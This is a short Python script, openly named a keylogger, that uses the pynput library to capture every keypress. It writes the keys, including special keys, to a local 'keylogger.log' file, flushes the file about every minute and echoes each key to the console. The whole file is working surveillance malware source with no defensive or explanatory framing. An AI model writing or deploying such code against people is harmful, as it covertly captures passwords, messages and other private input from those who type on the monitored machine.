import time
import data
from pynput import keyboard

file = open("keylogger.log", "w+")

def saveFile():
    file.flush()

def onpress(key):
    if time.time() >= data.Expire:
        saveFile()
        data.Expire = time.time()+60
        print("Saved successfully.")
    if key == keyboard.Key.enter:
        file.write("\n")
        file.flush()
        return
    elif key == keyboard.Key.space:
        key = " "
    elif str(key).startswith("Key."):
        key = str(key).replace("Key.", " [")+"] "
    file.write(str(key).replace("'", ""))
    print(key)

with keyboard.Listener(on_press=onpress) as listener:
    listener.join()